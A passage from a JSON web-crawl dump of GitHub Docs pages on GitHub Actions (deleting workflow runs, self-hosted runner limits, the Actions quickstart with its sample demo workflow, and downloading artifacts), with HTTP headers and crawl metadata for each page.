      "age": "17820",
      "date": "Thu, 08 May 2025 06:43:59 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686639.318827,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Deleting a workflow run - GitHub Docs\nYou can delete a workflow run that has been completed, or is more than two weeks old.\nWrite access to the repository is required to perform these steps.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nTo delete a workflow run, select , then click Delete workflow run.\nReview the confirmation prompt and click Yes, permanently delete this workflow run.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-72ju6.html",
  "markdown": "# Deleting a workflow run - GitHub Docs\n\nYou can delete a workflow run that has been completed, or is more than two weeks old.\n\nWrite access to the repository is required to perform these steps.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  To delete a workflow run, select , then click **Delete workflow run**.\n    \n    ![Screenshot of a list of workflow runs. To the right of a run, an icon of three horizontal dots is highlighted with an orange outline.](https://docs.github.com/assets/cb-28122/images/help/settings/workflow-delete-run.png)\n    \n5.  Review the confirmation prompt and click **Yes, permanently delete this workflow run**.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 199,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-deleting-a-workflow-run-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1928,
      "readableText": 2149,
      "none": 3578,
      "readableTextIfPossible": 3578,
      "result": 2149,
      "markdown": 1219
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners",
    "loadedTime": "2025-05-08T06:44:01.723Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners",
    "title": "Usage limits for self-hosted runners - GitHub Docs",
    "description": "There are some limits on GitHub Actions usage when using self-hosted runners. These limits are subject to change.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Usage limits for self-hosted runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/usage-limits-for-self-hosted-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "23969",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "974B:203D3B:75CBA1:9BDF2E:681C10DC",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "16824",
      "date": "Thu, 08 May 2025 06:44:01 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686642.668361,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Usage limits for self-hosted runners\nThere are some limits on GitHub Actions usage when using self-hosted runners. These limits are subject to change.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-usage-limits-for-self-hosted-runners-3ix49.html",
  "markdown": "# Usage limits for self-hosted runners\n\nThere are some limits on GitHub Actions usage when using self-hosted runners. These limits are subject to change.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 199,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-usage-limits-for-self-hosted-runners-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-usage-limits-for-self-hosted-runners-removedElementsHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-usage-limits-for-self-hosted-runners-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-usage-limits-for-self-hosted-runners-readableTextIfPossibleHt"
    },
    "lengths": {
      "extractus": 0,
      "readableText": 279,
      "none": 3474,
      "readableTextIfPossible": 3474,
      "result": 279,
      "markdown": 153
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/quickstart",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/quickstart",
    "loadedTime": "2025-05-08T06:44:03.944Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/quickstart",
    "title": "Quickstart for GitHub Actions - GitHub Docs",
    "description": "Try out the features of GitHub Actions in 5 minutes or less.",
    "author": null,
    "keywords": "Fundamentals",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Quickstart for GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/quickstart"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/quickstart"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "29758",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1727:CED9B:28E938:34F3C7:681BE31C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "28568",
      "date": "Thu, 08 May 2025 06:44:03 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686644.928981,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Quickstart for GitHub Actions - GitHub Docs\nTry out the features of GitHub Actions in 5 minutes or less.\nIntroduction\nGitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that run tests whenever you push a change to your repository, or that deploy merged pull requests to production.\nThis quickstart guide shows you how to use the user interface of GitHub to add a workflow that demonstrates some of the essential features of GitHub Actions.\nTo get started with preconfigured workflows, browse through the list of templates in the actions/starter-workflows repository. For more information, see Using workflow templates.\nFor an overview of GitHub Actions workflows, see About workflows. If you want to learn about the various components that make up GitHub Actions, see Understanding GitHub Actions.\nUsing workflow templates\nGitHub provides preconfigured workflow templates that you can use as-is or customize to create your own workflow. GitHub analyzes your code and shows you workflow templates that might be useful for your repository. For example, if your repository contains Node.js code, you'll see suggestions for Node.js projects.\nThese workflow templates are designed to help you get up and running quickly, offering a range of configurations such as:\nCI: Continuous Integration workflows\nDeployments: Deployment workflows\nAutomation: Automating workflows\nCode Scanning: Code Scanning workflows\nPages: Pages workflows\nUse these workflows as a starting place to build your custom workflow or use them as-is. You can browse the full list of workflow templates in the actions/starter-workflows repository. For more information, see Using workflow templates.\nPrerequisites\nThis guide assumes that:\nYou have at least a basic knowledge of how to use GitHub. If you don't, you'll find it helpful to read some of the articles in the documentation for repositories and pull requests first. For example, see Quickstart for repositories, About branches, and About pull requests.\nYou have a repository on GitHub where you can add files.\nYou have access to GitHub Actions.\nCreating your first workflow\nIn your repository on GitHub, create a workflow file called github-actions-demo.yml in the .github/workflows directory. To do this:\nIf the .github/workflows directory already exists, navigate to that directory on GitHub, click Add file, then click Create new file, and name the file github-actions-demo.yml.\nIf your repository doesn't have a .github/workflows directory, go to the main page of the repository on GitHub, click Add file, then click Create new file, and name the file .github/workflows/github-actions-demo.yml. This creates the .github and workflows directories and the github-actions-demo.yml file in a single step.\nNote\nFor GitHub to discover any GitHub Actions workflows in your repository, you must save the workflow files in a directory called .github/workflows.\nYou can give the workflow file any name you like, but you must use .yml or .yaml as the file name extension. YAML is a markup language that's commonly used for configuration files.\nCopy the following YAML contents into the github-actions-demo.yml file:\nYAML\nname: GitHub Actions Demo run-name: ${{ github.actor }} is testing out GitHub Actions 🚀 on: [push] jobs: Explore-GitHub-Actions: runs-on: ubuntu-latest steps: - run: echo \"🎉 The job was automatically triggered by a ${{ github.event_name }} event.\" - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by GitHub!\" - run: echo \"🔎 The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}.\" - name: Check out repository code uses: actions/checkout@v4 - run: echo \"💡 The ${{ github.repository }} repository has been cloned to the runner.\" - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\" - name: List files in the repository run: | ls ${{ github.workspace }} - run: echo \"🍏 This job's status is ${{ job.status }}.\" \nAt this stage you don't need to understand the details of this workflow. For now, you can just copy and paste the contents into the file. After completing this quickstart guide, you can learn about the syntax of workflow files in About workflows, and for an explanation of GitHub Actions contexts, such as ${{ github.actor }} and ${{ github.event_name }}, see Accessing contextual information about workflow runs.\nClick Commit changes.\nIn the \"Propose changes\" dialog, select either the option to commit to the default branch or the option to create a new branch and start a pull request. Then click Commit changes or Propose changes.\nCommitting the workflow file to a branch in your repository triggers the push event and runs your workflow.\nIf you chose to start a pull request, you can continue and create the pull request, but this is not necessary for the purposes of this quickstart because the commit has still been made to a branch and will trigger the new workflow.\nViewing your workflow results\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to display, in this example \"GitHub Actions Demo.\"\nFrom the list of workflow runs, click the name of the run you want to see, in this example \"USERNAME is testing out GitHub Actions.\"\nIn the left sidebar of the workflow run page, under Jobs, click the Explore-GitHub-Actions job.\nThe log shows you how each of the steps was processed. Expand any of the steps to view its details.\nFor example, you can see the list of files in your repository:\nThe example workflow you just added is triggered each time code is pushed to the branch, and shows you how GitHub Actions can work with the contents of your repository. For an in-depth tutorial, see Understanding GitHub Actions.\nNext steps\nGitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:\nTo create a GitHub Actions workflow, see Using workflow templates.\nFor continuous integration (CI) workflows, see Building and testing.\nFor building and publishing packages, see Publishing packages.\nFor deploying projects, see Use cases and examples.\nFor automating tasks and processes on GitHub, see Managing projects.\nFor examples that demonstrate more complex features of GitHub Actions, see Use cases and examples. These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.\nTo certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, see About GitHub Certifications.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-xr837.html",
  "markdown": "# Quickstart for GitHub Actions - GitHub Docs\n\nTry out the features of GitHub Actions in 5 minutes or less.\n\n## [Introduction](#introduction)\n\nGitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that run tests whenever you push a change to your repository, or that deploy merged pull requests to production.\n\nThis quickstart guide shows you how to use the user interface of GitHub to add a workflow that demonstrates some of the essential features of GitHub Actions.\n\nTo get started with preconfigured workflows, browse through the list of templates in the [actions/starter-workflows](https://github.com/actions/starter-workflows) repository. For more information, see [Using workflow templates](https://docs.github.com/en/actions/writing-workflows/using-starter-workflows).\n\nFor an overview of GitHub Actions workflows, see [About workflows](https://docs.github.com/en/actions/using-workflows/about-workflows). If you want to learn about the various components that make up GitHub Actions, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n## [Using workflow templates](#using-workflow-templates)\n\nGitHub provides preconfigured workflow templates that you can use as-is or customize to create your own workflow. GitHub analyzes your code and shows you workflow templates that might be useful for your repository. For example, if your repository contains Node.js code, you'll see suggestions for Node.js projects.\n\nThese workflow templates are designed to help you get up and running quickly, offering a range of configurations such as:\n\n*   CI: [Continuous Integration workflows](https://github.com/actions/starter-workflows/tree/main/ci)\n*   Deployments: [Deployment workflows](https://github.com/actions/starter-workflows/tree/main/deployments)\n*   Automation: [Automating workflows](https://github.com/actions/starter-workflows/tree/main/automation)\n*   Code Scanning: [Code Scanning workflows](https://github.com/actions/starter-workflows/tree/main/code-scanning)\n*   Pages: [Pages workflows](https://github.com/actions/starter-workflows/tree/main/pages)\n\nUse these workflows as a starting place to build your custom workflow or use them as-is. You can browse the full list of workflow templates in the [actions/starter-workflows](https://github.com/actions/starter-workflows) repository. For more information, see [Using workflow templates](https://docs.github.com/en/actions/writing-workflows/using-starter-workflows).\n\n## [Prerequisites](#prerequisites)\n\nThis guide assumes that:\n\n*   You have at least a basic knowledge of how to use GitHub. If you don't, you'll find it helpful to read some of the articles in the documentation for repositories and pull requests first. For example, see [Quickstart for repositories](https://docs.github.com/en/repositories/creating-and-managing-repositories/quickstart-for-repositories), [About branches](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-branches), and [About pull requests](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests).\n    \n*   You have a repository on GitHub where you can add files.\n    \n*   You have access to GitHub Actions.\n    \n\n## [Creating your first workflow](#creating-your-first-workflow)\n\n1.  In your repository on GitHub, create a workflow file called `github-actions-demo.yml` in the `.github/workflows` directory. To do this:\n    \n    *   If the `.github/workflows` directory already exists, navigate to that directory on GitHub, click **Add file**, then click **Create new file**, and name the file `github-actions-demo.yml`.\n        \n    *   If your repository doesn't have a `.github/workflows` directory, go to the main page of the repository on GitHub, click **Add file**, then click **Create new file**, and name the file `.github/workflows/github-actions-demo.yml`. This creates the `.github` and `workflows` directories and the `github-actions-demo.yml` file in a single step.\n        \n    \n    Note\n    \n    For GitHub to discover any GitHub Actions workflows in your repository, you must save the workflow files in a directory called `.github/workflows`.\n    \n    You can give the workflow file any name you like, but you must use `.yml` or `.yaml` as the file name extension. YAML is a markup language that's commonly used for configuration files.\n    \n2.  Copy the following YAML contents into the `github-actions-demo.yml` file:\n    \n    YAML\n    \n    ```\n    name: GitHub Actions Demo\n    run-name: ${{ github.actor }} is testing out GitHub Actions 🚀\n    on: [push]\n    jobs:\n      Explore-GitHub-Actions:\n        runs-on: ubuntu-latest\n        steps:\n          - run: echo \"🎉 The job was automatically triggered by a ${{ github.event_name }} event.\"\n          - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by GitHub!\"\n          - run: echo \"🔎 The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}.\"\n          - name: Check out repository code\n            uses: actions/checkout@v4\n          - run: echo \"💡 The ${{ github.repository }} repository has been cloned to the runner.\"\n          - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\"\n          - name: List files in the repository\n            run: |\n              ls ${{ github.workspace }}\n          - run: echo \"🍏 This job's status is ${{ job.status }}.\"\n    ```\n    \n    At this stage you don't need to understand the details of this workflow. For now, you can just copy and paste the contents into the file. After completing this quickstart guide, you can learn about the syntax of workflow files in [About workflows](https://docs.github.com/en/actions/using-workflows/about-workflows#understanding-the-workflow-file), and for an explanation of GitHub Actions contexts, such as `${{ github.actor }}` and `${{ github.event_name }}`, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts).\n    \n3.  Click **Commit changes**.\n    \n4.  In the \"Propose changes\" dialog, select either the option to commit to the default branch or the option to create a new branch and start a pull request. Then click **Commit changes** or **Propose changes**.\n    \n    ![Screenshot of the \"Propose changes\" dialog with the areas mentioned highlighted with an orange outline.](https://docs.github.com/assets/cb-71777/images/help/repository/actions-quickstart-commit-new-file.png)\n    \n\nCommitting the workflow file to a branch in your repository triggers the `push` event and runs your workflow.\n\nIf you chose to start a pull request, you can continue and create the pull request, but this is not necessary for the purposes of this quickstart because the commit has still been made to a branch and will trigger the new workflow.\n\n## [Viewing your workflow results](#viewing-your-workflow-results)\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to display, in this example \"GitHub Actions Demo.\"\n    \n    ![Screenshot of the \"Actions\" page. The name of the example workflow, \"GitHub Actions Demo\", is highlighted by a dark orange outline.](https://docs.github.com/assets/cb-64036/images/help/repository/actions-quickstart-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run you want to see, in this example \"USERNAME is testing out GitHub Actions.\"\n    \n5.  In the left sidebar of the workflow run page, under **Jobs**, click the **Explore-GitHub-Actions** job.\n    \n    ![Screenshot of the \"Workflow run\" page. In the left sidebar, the \"Explore-GitHub-Actions\" job is highlighted with a dark orange outline.](https://docs.github.com/assets/cb-53820/images/help/repository/actions-quickstart-job.png)\n    \n6.  The log shows you how each of the steps was processed. Expand any of the steps to view its details.\n    \n    ![Screenshot of steps run by the workflow.](https://docs.github.com/assets/cb-95207/images/help/repository/actions-quickstart-logs.png)\n    \n    For example, you can see the list of files in your repository:\n    \n    ![Screenshot of the \"List files in the repository\" step expanded to show the log output. The output for the step is highlighted with an orange outline.](https://docs.github.com/assets/cb-53977/images/help/repository/actions-quickstart-log-detail.png)\n    \n\nThe example workflow you just added is triggered each time code is pushed to the branch, and shows you how GitHub Actions can work with the contents of your repository. For an in-depth tutorial, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n## [Next steps](#next-steps)\n\nGitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:\n\n*   To create a GitHub Actions workflow, see [Using workflow templates](https://docs.github.com/en/actions/learn-github-actions/using-starter-workflows).\n*   For continuous integration (CI) workflows, see [Building and testing](https://docs.github.com/en/actions/automating-builds-and-tests).\n*   For building and publishing packages, see [Publishing packages](https://docs.github.com/en/actions/publishing-packages).\n*   For deploying projects, see [Use cases and examples](https://docs.github.com/en/actions/deployment).\n*   For automating tasks and processes on GitHub, see [Managing projects](https://docs.github.com/en/actions/managing-issues-and-pull-requests).\n*   For examples that demonstrate more complex features of GitHub Actions, see [Use cases and examples](https://docs.github.com/en/actions/examples). These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.\n*   To certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, see [About GitHub Certifications](https://docs.github.com/en/get-started/showcase-your-expertise-with-github-certifications/about-github-certifications).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 234,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-quickstart-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 14845,
      "readableText": 14252,
      "none": 19174,
      "readableTextIfPossible": 14252,
      "result": 14252,
      "markdown": 10829
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts",
    "loadedTime": "2025-05-08T06:44:06.467Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts",
    "title": "Downloading workflow artifacts - GitHub Docs",
    "description": "You can download archived artifacts before they automatically expire.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Downloading workflow artifacts - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "26456",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "42AA:1FB90B:50196F:6995C4:681BF995",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "22816",
      "date": "Thu, 08 May 2025 06:44:06 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686646.440693,VS0,VE2",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Downloading workflow artifacts - GitHub Docs\nYou can download archived artifacts before they automatically expire.\nWho can use this feature?\nPeople who are signed into GitHub and have read access to a repository can download workflow artifacts.\nBy default, GitHub stores build logs and artifacts for 90 days, and you can customize this retention period, depending on the type of repository. For more information, see Managing GitHub Actions settings for a repository.\nRead access to the repository is required to perform these steps.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-ctu5w.html",
  "markdown": "# Downloading workflow artifacts - GitHub Docs\n\nYou can download archived artifacts before they automatically expire.\n\n## Who can use this feature?\n\nPeople who are signed into GitHub and have read access to a repository can download workflow artifacts.\n\nBy default, GitHub stores build logs and artifacts for 90 days, and you can customize this retention period, depending on the type of repository. For more information, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#configuring-the-retention-period-for-github-actions-artifacts-and-logs-in-your-repository).\n\nRead access to the repository is required to perform these steps.",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 203,
